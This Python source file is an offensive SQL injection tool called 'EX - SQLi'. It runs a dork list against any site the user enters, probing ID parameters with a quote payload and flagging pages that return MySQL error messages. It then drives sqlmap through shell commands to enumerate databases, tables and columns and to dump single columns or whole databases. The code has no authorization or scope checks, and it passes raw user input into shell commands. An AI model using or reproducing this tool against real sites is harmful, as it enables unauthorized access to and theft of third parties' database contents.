import os
import aiohttp
import asyncio
import re
import platform
import webbrowser
from pyfiglet import Figlet
import subprocess
import sys


GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

uname = []
payload = "'"
num_id = range(1, 100)

def load_dorks(filename="dork.txt"):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print(f"File {filename} not found.")
        return []

page = load_dorks()

def check_site(site):
    if not site.startswith("http"):
        site = f"http://{site}"
    return site

async def scan_page(session, site, pg, ids):
    site_sql = f"{site}/{pg}{ids}{payload}"
    try:
        async with session.get(site_sql) as response:
            sqli_injection = f"{site}/{pg}{ids}"
            source_code = await response.text()
            if re.search(r'You have an error in your SQL syntax;', source_code):
                status = f"-| \033[1;32mSQL INJECTION : {sqli_injection}"
                sys.stdout.write("\r" + status)
                sys.stdout.flush()
                with open('sites_sql.txt', 'a', encoding='utf-8') as site_file:
                    site_file.write(f"{sqli_injection}\n")
                exploits = input(f"\n{RESET}#{RED} Do you want to exploit it now? :{RESET} ")
                if exploits.lower() in ['yes', 'y']:
                    await exploit(sqli_injection)
                
            else:
                status = f"{RESET}-| {GREEN} Scanning :{RESET} {site} {RED}~ {RESET}[ {GREEN}ID: {ids} ~ {page.index(pg) + 1}/{len(page)}{RESET} ]"
            sys.stdout.write("\r" + status)
            sys.stdout.flush()
    except Exception as e:
        pass

async def scanning(site):
    site = check_site(site)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for pg in page:
            for ids in num_id:
                task = asyncio.create_task(scan_page(session, site, pg, ids))
                tasks.append(task)
        await asyncio.gather(*tasks)

async def exploit(site):
    site = check_site(site)
    for pg in page:
        for ids in num_id:
            sqlmap_cmd = f"python sqlmap.py -u {site}/{pg}{ids} --dbs --batch"
            subprocess.run(sqlmap_cmd, shell=True)
            db = input("\033[90m╔═══[Enter Database Name ]\n╚══>>>   \033[32m")
            sqlmap_cmd = f"python sqlmap.py -u {site}/{pg}{ids} -D {db} --tables"
            subprocess.run(sqlmap_cmd, shell=True)
            table = input("\033[90m╔═══[Enter Table Name ]\n╚══>>>   \033[32m")
            sqlmap_cmd = f"python sqlmap.py -u {site}/{pg}{ids} -D {db} -T {table} --columns"
            subprocess.run(sqlmap_cmd, shell=True)
            dn = input("\033[1;31mDo you want to load the table or slot to load the table, type [d]: ")
            if dn.lower() == "d":
                col = input("\033[1;31m[+] Write to me the name of the column you want to download: ")
                sqlmap_cmd = f"python sqlmap.py -u {site}/{pg}{ids} -D {db} -T {table} -C {col} --dump"
                subprocess.run(sqlmap_cmd, shell=True)
            else:
                d_all = input("\033[1;31mDo you want to download the entire database [y/n]: ")
                if d_all.lower() == "y":
                    sqlmap_cmd = f"python sqlmap.py -u {site}/{pg}{ids} -D {db} --dump"
                    subprocess.run(sqlmap_cmd, shell=True)

def main():
    try:
        if platform.system() == "Linux":
            os.system('clear')
        else:
            os.system('cls')

        f = Figlet(font='slant')
        print(RED + f.renderText('EX - SQLi'))
        print(RESET+ "               Coded By inst: cyber_77k\n\n")
        print(f"""

{RED}[{RESET}1{RED}] {GREEN}EXPLOIT SQLI       {RED}[{RESET}2{RED}] {GREEN} SCANNING SQLi
{RED}[{RESET}3{RED}] {GREEN}ABOUT DEVELOPER    {RED}[{RESET}4{RED}] {GREEN} ABOUT SOFTWARE
        """)
        sqli = input(f"\n{RED}╔═══{GREEN}[ {RESET}root{GREEN}@{RESET}Ex-SQLi ~ V0.1 {GREEN}] \n{RED}╚══>>>   \033[32m")
        
        if sqli == '1':
            site = input(f"\n{RED}╔═══{GREEN}[ {RESET}ENTER URL{GREEN}] \n{RED}╚══>>>   \033[32m")
            asyncio.run(exploit(site))
        elif sqli == '2':
            site = input(f"\n{RED}╔═══{GREEN}[ {RESET}ENTER URL{GREEN}] \n{RED}╚══>>>   \033[32m")
            asyncio.run(scanning(site))
        elif sqli == '3':
            about_developer()
        elif sqli == '4':
            about_software()
    except Exception as s:
        print(f"Error: {s}")

def about_developer():
    print(f"""
{CYAN}About The Developer{RESET}
{YELLOW}------------------{RESET}
{GREEN}Name:{RESET} Mr.SaMi From Yemen 
{GREEN}Telegram:{RESET} https://t.me/SaMi_ye 
{GREEN}GitHub:{RESET} https://github.com/0.d3y
{GREEN}Website:{RESET} https://sami-soft-ye.blogspot.com
{YELLOW}------------------{RESET}
    """)
    input(f"{RED}-| {RESET}Press Enter to return ~{RED}# {GREEN}")
    main()

def about_software():
    print(f"""
{CYAN}About the Software{RESET}
{YELLOW}------------------{RESET}
{GREEN}Name:{RESET} EX - SQLi
{GREEN}Version:{RESET} 1.0
{GREEN}Features:{RESET}
  - Fast and efficient SQL Injection scanning
  - Supports batch processing of multiple URLs
  - High accuracy with detection of common SQL error patterns
  - User-friendly interface with detailed logging

{GREEN}Speed:{RESET} Optimized for high performance with asynchronous requests
{GREEN}Accuracy:{RESET} High accuracy in detecting SQL Injection vulnerabilities using common error patterns
{YELLOW}------------------{RESET}
    """)
    input(f"{RED}-| {RESET}Press Enter to return ~{RED}# {GREEN}")
    main()

def login():
    try:
        with open("ch.txt", 'r', encoding='utf-8') as file:
            sami_ch = file.read().splitlines()
        if 'ok' in sami_ch:
            main()
    except FileNotFoundError:
        webbrowser.open('https://t.me/i_0d3y')
        with open('ch.txt', 'w', encoding='utf-8') as file:
            file.write('ok')
        main()

login()
